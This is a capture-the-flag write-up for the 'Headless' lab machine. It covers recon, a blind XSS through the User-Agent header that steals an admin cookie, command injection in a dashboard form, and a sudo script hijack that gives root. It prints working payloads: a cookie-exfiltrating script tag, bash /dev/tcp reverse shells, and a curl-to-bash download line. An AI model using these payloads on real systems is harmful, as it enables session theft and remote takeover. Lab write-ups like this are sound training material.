# Headless

## Recon

### Nmap

#### TCP
```
$ s nmap 10.10.11.8 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-19 09:09 CEST
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 73.04% done; ETC: 09:10 (0:00:09 remaining)
Nmap scan report for 10.10.11.8
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 31.93 seconds
~ took 31s
```

- What is upnp?
> The port isn't actually upnp is a web server
- Check ssh?
> OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

#### UDP

nothing intersessting

### Web at port 5000

Landing page with support page.

#### Manual inspection

- There is a cookie set `is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs`. The first part of the value `InVzZXIi` is base64 for `"user"`
- There is a page `/support` with a form to send a message to the admin. There are 5 fields:
    - First name
    - Second name
    - Email
    - Phone
    - Comment

- The page `/dashboard` gives a 401 error code with the default cookie. The error message reads the following:
```
The server could not verify that you are authorized to access the URL requested. You either supplied the wrong credentials (e.g. a bad password), or your browser doesn't understand how to supply the credentials required.
```
When tampering with the cookie (setting the "user" part to "admin" or "administrator") it returns a 500 with the following error message:
```
The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.
```
- The webserver is `Werkzeug` version 2.2.2. It is a Flask derivate (python).

- When trying to XSS the comment field on the form in the `/support` page a message withhacking attempt detected appears:
```
Hacking Attempt Detected

Your IP address has been flagged, a report with your browser information has been sent to the administrators for investigation.

Client Request Information:

Method: POST
URL: http://10.10.11.8:5000/support
Headers: Host: 10.10.11.8:5000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.8:5000/support
Content-Length: 151
Origin: http://10.10.11.8:5000
Connection: keep-alive
Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Cache-Control: no-cache
```
The other fields although you can XSS don't ping back. Reading the previous message it says the messages is sent to admins. Maybe XSS one of the fields on the message gets the trick done.

##### The dashboard
> After getting acces to the dashboard.

There is a form to get reports of the server with only one field, the date. Modifying the request to append `;echo hola` prints back hola to the screen. Seems a rce.

#### Automated

##### Directory enumeration

```
$ gobuster dir -u http://10.10.11.8:5000 -w directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.8:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/support              (Status: 200) [Size: 2363]
/dashboard            (Status: 500) [Size: 265]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

### Exploitation

#### Web application

Setting the user agent to a XSS (`<script>var img=new Image();img.src='http://10.10.14.18:1234/'+btoa(document.cookie);</script>`) as the same time setting it in the message field triggers the `hacker attempt detected` message and pings back home.

```
$ python -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.11.8 - - [19/Jul/2024 11:25:54] "GET /?c=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
$ echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0~
```

We get the cookie. Passing the first segment of the cookie through a base64 decoder we get `"admin"`. Looks good.
Setting the cookie and accessing the page `/dashboard` the status code changes from 401 to 200 and we get acces to the dashboard.

Inside the `/dashboard` there is a form with rce by just appending commands to the request field date. Testing for curl (`which curl`) we get a path response meaning it exists.
We create a payload:
```
$ cat shell.sh 
bash -i >& /dev/tcp/10.10.14.18/1234 0>&1
```

And we upload it and run it using the rce (`;curl http://10.10.14.18:1111/shell.sh|bash`) and we get a reverse shell.

#### User flag

Going to the home there it is:
```
dvir@headless:~$ ls
ls
app
geckodriver.log
user.txt
dvir@headless:~$ cat user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

#### Privilege scalation

Using linpeas or sudo -l wee can see that we can execute a command as sudo without password `/usr/bin/syscheck`. It is a bash script and it we read it we will see it calls to execution another script called `initdb.sh`. Looking for that script it turns out to be in `/home/dvir/app/` which is a directory where we can read and write.

We prepare another revers shell inside the script
```
$ cat initdb.sh 
bash -i >& /dev/tcp/10.10.14.18/1235 0>&1
```

and execute `sudo syscheck`. Another shell pops this time with rool privileges.
We navigate to the home folder and extract the flag:
```
root@headless:/home/dvir/app# cd
cd
root@headless:~# ls
ls
root.txt
root@headless:~# cat root.txt   
cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
